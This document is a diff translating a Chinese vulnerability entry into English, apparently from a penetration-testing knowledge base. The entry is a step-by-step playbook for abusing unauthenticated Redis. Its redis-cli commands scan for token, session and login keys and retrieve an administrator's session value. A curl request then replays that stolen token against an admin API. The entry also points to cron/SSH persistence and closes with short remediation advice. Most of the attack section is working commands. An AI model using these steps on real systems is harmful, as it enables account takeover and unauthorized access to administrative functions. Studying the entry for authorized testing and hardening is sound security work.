@@ -1,62 +1,62 @@
 ﻿---
-title: Redis 未授权 → 偷后台 session / token 直接进后台
-cve: 无（配置缺陷）
+title: Unauthenticated Redis → steal admin sessions / tokens for direct admin access
+cve: None (configuration flaw)
 severity: critical
 cvss: 9.1
-product: 自研后台（session/token 存 Redis）
-versions: 任意
+product: Custom admin panels (sessions/tokens stored in Redis)
+versions: Any
 ports: 6379
-keywords: redis, 未授权, session, token, 后台, 接管
-entry: Redis 里的 login/session/token 键
+keywords: redis, unauthenticated access, session, token, admin panel, takeover
+entry: login/session/token keys in Redis
 verified: false
-sources: 公开资料整理（配置缺陷类）
+sources: Compiled from public sources (configuration flaws)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
-redis-cli -h target ping          → PONG（未授权）
-redis-cli -h target info          → 版本与 keyspace
+redis-cli -h target ping          → PONG (unauthenticated access)
+redis-cli -h target info          → Version and keyspace
 ```
 
-## 前置条件
+## Prerequisites
 
-- Redis 暴露且无密码；应用把登录态存 Redis（多数 Java/PHP 后台）。
+- Redis is exposed without a password; the application stores login state in Redis (most Java/PHP admin panels).
 
 ## PoC
 
 ```bash
-# 1) 确认未授权
+# 1) Confirm unauthenticated access
 redis-cli -h target ping
 
-# 2) 找登录态键
+# 2) Find login-state keys
 redis-cli -h target --scan --pattern '*token*'  | head
 redis-cli -h target --scan --pattern '*session*' | head
 redis-cli -h target --scan --pattern '*login*'  | head
 
-# 3) 取一个管理员会话值（JSON 或 序列化串）
+# 3) Retrieve an administrator session value (JSON or serialized string)
 redis-cli -h target get "login_tokens:<uuid>"
-# 判定：值里含 userId=1 / admin / roles = 可直接冒用
+# Confirmation: value contains userId=1 / admin / roles = direct impersonation possible
 ```
 
 ```bash
-# 4) 用 token 调后台
-curl -s 'https://target/api/admin/user/list' -H 'Authorization: Bearer <token值>' | head -c 200
+# 4) Call the admin API using the token
+curl -s 'https://target/api/admin/user/list' -H 'Authorization: Bearer <token-value>' | head -c 200
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先 ping（无破坏）；
-2. 扫 `token/session/login` 三类键，挑 principal 是管理员的；
-3. 用值直接调接口验证；
-4. 需要持久时再考虑写 cron/SSH（属另一条链，别在这里做）；
-5. 证据：键名 + 值里的 userId/roles（打码）+ 接口 200。
+1. Start with ping (non-destructive);
+2. Scan the three `token/session/login` key categories and select one whose principal is an administrator;
+3. Verify by calling the endpoint directly with the value;
+4. Consider writing cron/SSH only if persistence is needed (a separate chain; do not perform it here);
+5. Evidence: key name + userId/roles in the value (redacted) + endpoint 200 response.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- Redis 加密码 + 只监听内网 + 禁危险命令（rename-command CONFIG ""）；
-- 登录态加签名/绑定 IP+UA，缩短 TTL。
+- Password-protect Redis + bind only to internal interfaces + disable dangerous commands (rename-command CONFIG "");
+- Sign login state/bind it to IP+UA and shorten TTL.
 
-## 参考
+## References
 
-- Redis 安全基线；OWASP 会话管理。
+- Redis security baseline; OWASP session management.
